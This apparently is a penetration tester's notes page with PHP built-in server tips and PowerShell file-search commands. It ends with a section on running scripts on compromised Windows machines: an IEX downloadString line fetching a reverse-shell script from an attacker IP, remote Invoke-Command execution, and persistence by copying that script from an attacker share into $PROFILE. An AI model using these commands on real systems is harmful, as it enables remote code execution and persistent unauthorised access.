## PHP

[https://www.php.net/manual/en/features.commandline.webserver.php](https://www.php.net/manual/en/features.commandline.webserver.php) When starting php -S on a mac \(in my case macOS Sierra\) to host a local server, I had trouble with connecting from legacy Java. As it turned out, if you started the php server with `php -S localhost:80` the server will be started with ipv6 support only! To access it via ipv4, you need to change the start up command like so: `php -S 127.0.0.1:80` which starts server in ipv4 mode only.

Itâ€™s not mentioned directly, and may not be obvious, but you can also use this to create a virtual host. This, of course, requires the help of your hosts file. Here are the steps:

```text
1    /etc/hosts
    127.0.0.1    www.example.com
2    cd [root folder]
    php -S www.example.com:8000
3    Browser:
    http://www.example.com:8000/index.php
```

In order to set project specific configuration options, simply add a php.ini file to your project, and then run the built-in server with this flag: `php -S localhost:8000 -c php.ini`

Example \#6 Accessing the CLI Web Server From Remote Machines You can make the web server accessible on port 8000 to any interface with: `$ php -S 0.0.0.0:8000`

Example \#2 Starting with a specific document root directory

```text
$ cd ~/public_html
$ php -S localhost:8000 -t foo/
Listening on localhost:8000
Document root is /home/me/public_html/foo
```

[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) look for text in a file and lists its name and contents. 

Shorthand \(aliased\) version:

```text
ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}
```

Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep` 

Full version: 

```text
Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'dummy' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
```

Explanation:

```text
# Get a listing of all files within this folder and its subfolders.
Get-ChildItem -Recurse |

# Filter files according to a script.
Where-Object {
    # Pick only the files that contain the string 'dummy'.
    # Note: The -Quiet parameter tells Select-String to only return a Boolean. This is preferred if you just need to use Select-String as part of a filter, and don't need the output.
    (Select-String -InputObject $_ -Pattern 'dummy' -Quiet) -eq $true
} |

# Run commands against each object found.
ForEach-Object {
    # Output the file properties.
    Write-Output $_;

    # Output the file's contents.
    Get-Content $_
}
```

`ls -R|?{$_|Select-String 'dummy'}|%{$_;gc $_}`

Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names, you may want to note the following significant differences between the "full" versions and the "golfed" version:

`Select-String` was swapped to use piped input instead of `-InputObject`. The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional. The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line. `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true. \(Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.\) `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:

`ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}`

#### Execute .ps1 scripts on compromised machine in memory

If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.

```text
IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker_ipv4>/ReversePowerShell.ps1")
```

`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.

```text
Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
```

This will execute the file and it's contents on the remote computer.

Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.

```text
Write-Verbose "Creates powershell profile for user"
New-Item -Path $PROFILE -ItemType File -Force
#
# The $PROFILE VARIABLE IS EITHER GOING TO BE
#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
# OR
#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
#
# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1

powershell.exe
# If that does not work try reloading the user profile.
& $PROFILE
```
